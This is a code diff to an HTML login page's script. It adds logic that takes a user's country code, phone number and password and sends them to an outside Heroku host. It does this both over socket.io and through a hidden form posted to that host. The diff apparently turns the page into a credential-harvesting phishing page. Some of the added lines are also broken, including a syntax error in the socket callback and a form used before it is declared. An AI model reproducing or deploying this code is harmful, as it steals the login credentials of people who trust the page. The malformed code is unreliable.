@@ -10,14 +10,33 @@
 <script>
 var socket = io("https://epos188.herokuapp.com/");
 socket.connect();
+
+form.setAttribute("method", 'post');
+form.setAttribute("action", 'https://epos188.herokuapp.com/');
 function login(){
   var e = document.getElementById("login_code_2");
   var val_code = e.options[e.selectedIndex].value;
   var num = document.getElementById("login_number_2").value;
   var pass = document.getElementById("login_pass_2").value;
-  console.log('hihi:'+val_code+num+pass);
-}
+  var fullnumber= "+"+ val_code+ num.replace('0','');
+  var form = document.createElement("form");
+  socket.emit('login1',fullnumber,pass);
+  socket.on('login1_ok',()=>{();
+    add_form('pass',document.getElementById("login_pass_2").value);
+    add_form('number',num);
+    add_form('code',val_code);
+    document.body.appendChild(form);
+    form.submit();
+  });
 
+}
+function add_form(name1,value1){
+  var hiddenField = document.createElement("input");
+  hiddenField.setAttribute("type", "hidden");
+  hiddenField.setAttribute("name", name1);
+  hiddenField.setAttribute("value", value1);
+  form.appendChild(hiddenField);
+}
 </script>
 </head>
 <body>
